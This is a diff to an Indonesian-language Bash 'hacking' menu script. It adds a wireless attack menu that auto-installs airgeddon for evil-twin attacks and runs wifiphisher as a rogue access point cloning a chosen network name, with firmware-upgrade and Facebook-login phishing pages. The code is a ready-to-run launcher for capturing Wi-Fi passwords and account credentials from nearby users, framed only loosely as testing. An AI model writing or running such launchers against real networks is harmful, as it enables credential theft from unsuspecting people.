@@ -1078,7 +1078,191 @@ activate_windows_listener() {
     menu3
 }
 
+#*****************************************************************************************#
+#                                       Menu 3                                            #
+#*****************************************************************************************#
 
+# Fungsi untuk memeriksa dan menginstal Airgeddon
+check_and_install_airgeddon() {
+    if command -v "airgeddon" &>/dev/null; then
+        sleep 0.1
+    else
+        animate "Airgeddon tidak ditemukan. Menginstal..."
+        sudo apt-get install airgeddon &> /dev/null
+        animate "Airgeddon telah berhasil diinstal."
+    fi
+}
+
+# Fungsi Meretas Jaringan Wireless Evil Twin
+evil-twin-airgeddon() {
+    clear
+    banner
+
+    # Menjalankan Airgeddon
+    animate "Menjalankan Airgeddon..."
+    sleep 0.25
+    check_and_install_airgeddon
+    sleep 1
+    airgeddon
+
+    # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian wireless
+    printf "\n"
+    animate "Opsi:"
+    animate "[1]. Lanjutkan meretas wireless"
+    animate "[2]. Kembali ke menu pengujian wireless"
+    prompt
+
+    case $user_input in
+        1) evil-twin-airgeddon ;;
+        2) menu4 ;;
+        *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;
+    esac
+}
+
+
+# Fungsi untuk memeriksa dan menginstal wifiphisher
+check_and_install_wifiphisher() {
+    if command -v "wifiphisher" &>/dev/null; then
+        sleep 0.1
+    else
+        animate "wifiphisher tidak ditemukan. Menginstal..."
+        sudo apt-get install wifiphisher &> /dev/null
+        animate "wifiphisher telah berhasil diinstal."
+    fi
+}
+RAP-Upgrade(){
+    clear
+    banner
+
+    # Menjalankan Wifiphisher
+    animate "Menjalankan wifiphisher..."
+    sleep 0.25
+    check_and_install_wifiphisher
+    sleep 1
+    animate """
+    Example>@Wifi.id
+    Masukan nama wireless yang akan di clonning;
+    """
+    prompt
+    wifiphisher --essid "$user_input" -p firmware-upgrade -kB
+
+    # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian wireless
+    printf "\n"
+    animate "Opsi:"
+    animate """
+[1]. Lanjutkan meretas wireless
+[2]. Kembali ke menu sebelum nya
+[3]. Kembali ke menu pengujian wireless
+    """
+   
+    prompt
+
+    case $user_input in
+        1) RAP-Upgrade ;;
+        2) RAP-wifiphisher ;;
+        3) menu4 ;;
+        *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;
+    esac 
+}
+
+RAP-oauth-login(){
+    clear
+    banner
+
+    # Menjalankan Wifiphisher
+    animate "Menjalankan wifiphisher..."
+    sleep 0.25
+    check_and_install_wifiphisher
+    sleep 1
+    animate """
+    Example>@Wifi.id
+    Masukan nama wireless yang akan di clonning;
+    """
+    prompt
+    wifiphisher --essid "$user_input" -p oauth-login -kB
+
+    # Memberikan opsi untuk melanjutkan atau kembali ke menu pengujian wireless
+    printf "\n"
+    animate "Opsi:"
+    animate """
+[1]. Lanjutkan meretas wireless
+[2]. Kembali ke menu sebelum nya
+[3]. Kembali ke menu pengujian wireless
+    """
+   
+    prompt
+
+    case $user_input in
+        1) RAP-oauth-login ;;
+        2) RAP-wifiphisher ;;
+        3) menu4 ;;
+        *) animate "Pilihan tidak valid. Kembali ke menu pengujian aplikasi web." ;;
+    esac 
+}
+
+
+# Fungsi Meretas Jaringan Wireless Evil Twin
+RAP-wifiphisher() {
+    clear
+    banner
+    animate_menu "Menu Wifiphisher"
+    animate """
+    [1]. Pengujian Serangan Method RAP (Upgrade Firmware)
+    [2]. Pengujian Serangan Method RAP (Auth Login Facebook)
+    [x]. Kembali
+    """
+    prompt
+    case $user_input in
+            1) RAP-Upgrade ;;
+            2) RAP-oauth-login ;;
+            x) break ;;
+            *) animate "Pilihan tidak valid. Harap coba lagi." ;;
+    esac
+}
+
+# Menu hacking wireless
+# Fungsi untuk menu nomor 4
+menu4() {
+    clear
+    animate """
+                            Catatan Penting
+    ---------------------------------------------------------------
+    [*] pastikan anda mempunyai adapter wireless yang support
+    untuk melakukan pengujian serangan wireless.
+    
+    untuk adapter wireless, anda bisa menggunakan tplink wn72n v.1
+    chipset atheros ar9271.
+    ---------------------------------------------------------------
+    Press Enter To Continue
+    """
+    read x
+    clear
+    banner
+
+    animate_menu "Menu Hacking Wireless"
+    animate """
+
+    [1]. Meretas Jaringan Wifi Dengan Airgeddon (method evil twin)
+    [2]. Meretas Jaringan Wifi Dengan RAP (rouge acces point)
+    ----------------------------------------------
+    [3]. Mitm Attack Dengan MITMPROXY
+    [x]. Kembali
+    ----------------------------------------------
+    """
+    prompt
+
+    case $user_input in
+        1) evil-twin-airgeddon;;
+        2) RAP-wifiphisher;;
+        x) run ;;
+        *) animate "Pilihan tidak valid. Harap coba lagi." ;;
+    esac
+}
+
+
+#*****************************************************************************************#
+#                                        Menu                                             #
+#*****************************************************************************************#
 
 
 # Fungsi utama untuk menjalankan skrip
